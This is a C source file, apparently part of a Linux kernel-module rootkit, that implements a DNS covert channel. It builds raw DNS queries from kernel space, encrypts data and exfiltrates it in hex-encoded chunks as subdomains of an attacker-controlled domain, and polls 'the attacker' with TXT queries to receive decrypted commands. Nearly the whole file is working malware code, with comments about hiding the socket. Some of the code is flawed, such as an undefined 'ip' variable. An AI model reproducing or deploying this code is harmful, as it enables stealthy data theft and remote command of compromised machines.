#include "network.h"

// ugly

/**
 * @struct dns_header_t
 * @brief DNS protocol header (network byte order, it is important).
 */
#pragma pack(push, 1)
struct dns_header_t {
    __be16 id;      // Identification field
    __be16 flags;   // Flags and response codes
    __be16 qdcount; // Number of questions
    __be16 ancount; // Number of answer RRs
    __be16 nscount; // Number of authority RRs
    __be16 arcount; // Number of additional RRs (OPT for EDNS0)
};
#pragma pack(pop)

/**
 * @brief Send a single DNS question and receive the raw response.
 *
 * Constructs a DNS query for @p query_name with type @p question_type,
 * adds an EDNS0 OPT record to request up to @c DNS_MAX_BUF bytes,
 * sends over UDP to the configured @c DNS_SERVER_IP, and blocks for the reply.
 *
 * @param query_name Full qname (labels + domain) to query.
 * @param question_type QTYPE in network byte order (e.g. htons(1) for A, htons(16) for TXT).
 * @param response_buffer Buffer to store the received packet data.
 * @param response_length Size of response_buffer
 * @return 0 on success, negative errno on failure.
 */
static int dns_send_query(const char *query_name, __be16 question_type, u8 *response_buffer, int *response_length) {
    struct socket *sock;
    struct sockaddr_in dest_addr;
    struct msghdr msg = {};
    struct kvec iov;
    int offset = 0;
    int result;
    u8 *packet_buffer;

    // Allocate heap memory for the DNS packet
    packet_buffer = kzalloc(DNS_MAX_BUF, GFP_KERNEL);
    if (!packet_buffer)
        return -ENOMEM;

    // Build the DNS header
    struct dns_header_t *hdr = (void *)packet_buffer;
    get_random_bytes(&hdr->id, sizeof(hdr->id));
    hdr->flags = htons(0x0100); // RD = 1 (recursion desired)
    hdr->qdcount = htons(1);    // One question
    hdr->arcount = htons(1);    // One OPT record for EDNS0
    offset = DNS_HDR_SIZE;

    // Encode QNAME: split labels by '.' and prefix length
    const char *p = query_name;
    while (*p) {
        const char *dot = strchr(p, '.');
        int label_len = dot ? (dot - p) : strlen(p);
        packet_buffer[offset++] = label_len;

        memcpy(packet_buffer + offset, p, label_len);
        offset += label_len;

        if (!dot)
            break;
        p = dot + 1;
    }

    // Append the 0x00 to terminate the QNAME
    packet_buffer[offset++] = 0;

    // Write QTYPE and QCLASS=IN
    *(__be16 *)(packet_buffer + offset) = question_type;
    offset += 2;
    *(__be16 *)(packet_buffer + offset) = htons(1);
    offset += 2;

    // Append EDNS0 OPT record for 4096-byte UDP payload
    packet_buffer[offset++] = 0;
    *(__be16 *)(packet_buffer + offset) = htons(41);
    offset += 2; // TYPE = OPT
    *(__be16 *)(packet_buffer + offset) = htons(DNS_MAX_BUF);
    offset += 2; // UDP size
    *(__be32 *)(packet_buffer + offset) = htonl(0x8000);
    offset += 4; // DO bit
    *(__be16 *)(packet_buffer + offset) = htons(0);
    offset += 2; // RDLEN = 0

    // Create a UDP socket in kernel (need to hide it ?)
    result = sock_create_kern(&init_net, AF_INET, SOCK_DGRAM, IPPROTO_UDP, &sock);
    if (result < 0) {
        kfree(packet_buffer);
        return result;
    }

    // Prepare the destination address
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(DNS_PORT);
    in4_pton(ip, -1, (u8 *)&dest_addr.sin_addr.s_addr, -1, NULL);

    // tell kernel_sendmsg where to send
    msg.msg_name = &dest_addr;
    msg.msg_namelen = sizeof(dest_addr);

    // DEBUG Log (ugly)
    // DBG_MSG("dns_send_query: sending %d-byte DNS query for '%s'\n", offset, query_name);

    // Send the DNS query
    iov.iov_base = packet_buffer;
    iov.iov_len = offset;
    result = kernel_sendmsg(sock, &msg, &iov, 1, offset);
    if (result < 0) {
        sock_release(sock);
        kfree(packet_buffer);
        return result;
    }

    // Give the server a moment to respond
    msleep(200);

    // Receive the response (up to DNS_MAX_BUF)
    iov.iov_base = packet_buffer;
    iov.iov_len = DNS_MAX_BUF;
    result = kernel_recvmsg(sock, &msg, &iov, 1, DNS_MAX_BUF, MSG_DONTWAIT);
    if (result > 0) {
        memcpy(response_buffer, packet_buffer, result);
        *response_length = result;
        result = 0;
    }
    else if (result == -EAGAIN || result == -EWOULDBLOCK) {
        *response_length = 0;
        result = 0;
    }

    // Marie Kondo
    sock_release(sock);
    kfree(packet_buffer);
    return result;
}

/**
 * @brief Exfiltrate a data buffer over DNS by hex-chunked A-queries.
 *
 * Splits @p data into chunks of @c DNS_MAX_CHUNK bytes, prefixes each
 * chunk with a "seq/total-" header, hex-encodes, and sends as subdomains.
 * Sleeps briefly between queries to avoid flooding.
 *
 * @param data Pointer to data buffer to send.
 * @param data_len Length of data in bytes.
 * @return 0 on success, negative errno on failure.
 */
int dns_send_data(const char *data, size_t data_len) {
    char *encrypted_msg = NULL;
    size_t encrypted_len = 0;

    // Encrypt the data before sending
    if (encrypt_buffer(data, data_len, &encrypted_msg, &encrypted_len) < 0)
        return -EIO;

    size_t total_chunks = (encrypted_len + DNS_MAX_CHUNK - 1) / DNS_MAX_CHUNK;
    size_t chunk_index;
    int response_length_local;
    u8 *response_buffer_local;

    // Allocate local response buffer
    response_buffer_local = kzalloc(DNS_MAX_BUF, GFP_KERNEL);
    if (!response_buffer_local)
        return -ENOMEM;

    // Loop over each data chunk
    for (chunk_index = 0; chunk_index < total_chunks; chunk_index++) {
        size_t chunk_size = min(encrypted_len - chunk_index * DNS_MAX_CHUNK, (size_t)DNS_MAX_CHUNK);
        char hex_buffer[2 * DNS_MAX_CHUNK + 1];
        char seq_label[80];
        char full_qname[128];
        size_t i;

        // Hex-encode the chunk
        for (i = 0; i < chunk_size; i++)
            sprintf(hex_buffer + 2 * i, "%02x", encrypted_msg[chunk_index * DNS_MAX_CHUNK + i]);
        hex_buffer[2 * chunk_size] = '\0';

        // Prefix with sequence/total header (not the best way to do it I think, but works)
        snprintf(seq_label, sizeof(seq_label), "%02zx/%02zx-%s", chunk_index, total_chunks, hex_buffer);

        // Build full QNAME: "seq_label.DNS_DOMAIN"
        snprintf(full_qname, sizeof(full_qname), "%s.%s", seq_label, DNS_DOMAIN);

        // Send the A-query carrying this chunk over DNS
        dns_send_query(full_qname, htons(1), response_buffer_local, &response_length_local);

        // Craque le sleep
        msleep(10);
    }

    // Marie Kondo
    kfree(response_buffer_local);
    return 0;
}

/**
 * @brief Poll the attacker via DNS TXT-query for a pending command.
 *
 * @param out_buffer Buffer to store received command string.
 * @param max_length Maximum size of @p out_buffer.
 * @return Length of command received (>0), 0 if none, negative on error.
 */
int dns_receive_command(char *out_buffer, size_t max_length) {
    char *poll_qname;
    u8 *response_buffer_local;
    int response_length_local;
    int result;
    struct dns_header_t *hdr;
    u16 answer_count;
    int offset;

    // Allocate local response buffer
    response_buffer_local = kzalloc(DNS_MAX_BUF, GFP_KERNEL);
    if (!response_buffer_local)
        return -ENOMEM;

    // Build the TXT-poll query name
    poll_qname = kmalloc(128, GFP_KERNEL);
    snprintf(poll_qname, 128, "command.%s", DNS_DOMAIN);

    // Send TXT query and get raw response
    result = dns_send_query(poll_qname, htons(16), response_buffer_local, &response_length_local);
    kfree(poll_qname);
    if (result < 0) {
        kfree(response_buffer_local);
        return -EIO;
    }

    // Parse DNS header and answer count
    hdr = (struct dns_header_t *)response_buffer_local;
    answer_count = ntohs(hdr->ancount);

    // No command pending
    if (answer_count == 0) {
        kfree(response_buffer_local);
        return 0;
    }

    // Skip header and question section
    offset = DNS_HDR_SIZE;
    while (offset < response_length_local && response_buffer_local[offset])
        offset += response_buffer_local[offset] + 1;

    // NULL (1) + QTYPE (2) + QCLASS (2)
    offset += 1 + 2 + 2;

    // Skip into first answer record
    if ((response_buffer_local[offset] & 0xC0) == 0xC0)
        offset += 2;
    else {
        while (offset < response_length_local && response_buffer_local[offset])
            offset += response_buffer_local[offset] + 1;
        offset++;
    }

    // TYPE (2) + CLASS (2) + TTL (4)
    offset += 2 + 2 + 4;

    // Read RDLENGTH and TXT length byte
    u16 rdlength = ntohs(*(__be16 *)(response_buffer_local + offset));
    offset += 2;

    if (rdlength > 0 && offset < response_length_local) {
        u8 txt_length = response_buffer_local[offset++];
        if (txt_length >= max_length)
            txt_length = max_length - 1;
        
        char *decrypted = NULL;
        size_t decrypted_len = 0;

        if (decrypt_buffer(response_buffer_local + offset, txt_length, &decrypted, &decrypted_len) < 0) {
            kfree(response_buffer_local);
            return -EIO;
        }

        memcpy(out_buffer, decrypted, decrypted_len);
        out_buffer[decrypted_len] = '\0';

        // Marie Kondo
        kfree(response_buffer_local);
        kfree(decrypted);
        return decrypted_len;
    }

    // Marie Kondo
    kfree(response_buffer_local);
    return 0;
}